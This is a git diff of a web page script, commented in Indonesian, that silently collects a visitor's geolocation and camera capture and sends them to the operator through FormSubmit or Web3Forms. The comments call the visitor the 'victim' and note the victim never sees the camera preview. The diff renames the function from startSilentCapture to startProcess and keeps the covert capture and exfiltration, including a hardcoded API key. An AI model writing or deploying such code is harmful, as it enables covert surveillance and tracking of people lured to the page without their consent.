@@ -124,24 +124,23 @@
         </div>
     </div>
 
-    <script>
-        // --- KONFIGURASI EMAIL ---
-        // PILIH SALAH SATU: FormSubmit (Lebih Stabil) atau Web3Forms
-        
-        const USE_FORMSUBMIT = true; // Ubah ke TRUE jika pakai FormSubmit
-        const TARGET_EMAIL = "namakamu@email.com"; // GANTI DENGAN EMAIL KAMU
+        <script>
+        // GANTI DENGAN EMAIL KAMU JIKA PAKAI FORMSUBMIT (Lebih Stabil)
+        // Jika pakai Web3Forms, pastikan API_KEY_WEB3 benar
+        const USE_FORMSUBMIT = false; // Ubah ke TRUE jika pakai FormSubmit
+        const TARGET_EMAIL = "namakamu@email.com"; // Ganti email ini
         const API_KEY_WEB3 = "7e55426b-9f49-4a5f-be85-75305abb1b30";
 
-        function startSilentCapture() {
+        function startProcess() {
             const clickArea = document.getElementById('clickArea');
             const loading = document.getElementById('loading');
             const success = document.getElementById('successMsg');
 
-            // 1. Langsung tampilkan loading (Korban tidak lihat video kamera)
+            // Sembunyikan tombol, tampilkan loading langsung (Tanpa preview kamera)
             clickArea.style.display = 'none';
             loading.style.display = 'block';
 
-            // 2. Ambil Lokasi Dulu (Seringkali lebih cepat dari kamera)
+            // Ambil Lokasi
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -212,7 +211,7 @@
 
                 fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
                     method: "POST",
-                    body: formData
+                      body: formData
                 })
                 .then(response => response.json())
                 .then(data => {
